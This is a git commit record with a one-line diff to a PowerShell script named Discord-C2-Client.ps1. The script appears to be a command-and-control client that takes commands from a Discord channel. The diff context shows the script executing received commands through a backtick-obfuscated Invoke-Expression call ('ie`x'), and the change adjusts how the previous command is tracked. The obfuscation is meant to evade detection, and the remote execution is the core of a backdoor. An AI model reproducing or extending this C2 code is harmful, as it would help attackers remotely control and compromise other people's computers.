234a850196fc4d7241d4776a4833d9be333560e6
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-11-19 17:05:28 +0000

    Update Discord-C2-Client.ps1

--- Discord-C2-Client.ps1
+++ Discord-C2-Client.ps1
@@ -519,7 +519,7 @@ while($true){
         }
         elseif (!($response -match "$previouscmd")) {
             $Result=ie`x($response) -ErrorAction Stop
-            if (($result.length -eq 0) -or ($result -contains "public_flags")){
+            if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -match "                                           ")){
                 $previouscmd = $response
             }
             else{
